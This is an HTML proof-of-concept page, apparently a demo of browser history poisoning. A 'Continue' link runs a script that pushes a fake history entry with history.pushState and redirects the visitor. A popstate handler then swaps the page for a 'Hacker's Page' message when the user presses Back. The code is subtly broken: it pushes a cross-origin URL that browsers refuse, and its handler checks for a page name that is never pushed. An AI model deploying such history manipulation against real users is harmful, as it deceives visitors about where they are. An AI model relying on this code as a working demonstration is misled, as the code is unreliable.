<!DOCTYPE html>
<html>
<head>
    <title>Continue</title>
</head>
<body>
    <h1> This is History.Back() function Poisoning Example</h1>
    <h3> Click on Continue to see the exploit</h3>
    <a onclick="exploit()" href="example_of_vuln.html">Continue...</a>

    <script type="text/javascript">
        function exploit() {
            // Push Hacker_page.html into the browser history
            history.pushState({ page: 1 }, "Hacker_page", "https://google.com");

            // Redirect to example_of_vuln.html
            window.location.href = 'example_of_vuln.html';
        }

        // Listen for the popstate event (triggered when the "Go Back" button is pressed)
        window.onpopstate = function(event) {
            if (document.location.href.indexOf('Hacker_page.html') !== -1) {
                // Dynamically inject the content of Hacker_page.html
                document.body.innerHTML = `
                    <h1 style="color:red">This is Hacker's Page</h1>
                    <h2 style="color:blue">Your browser history was manipulated to send you to a page you never even visited!</h2>
                `;
            }
        };
    </script>
</body>
</html>
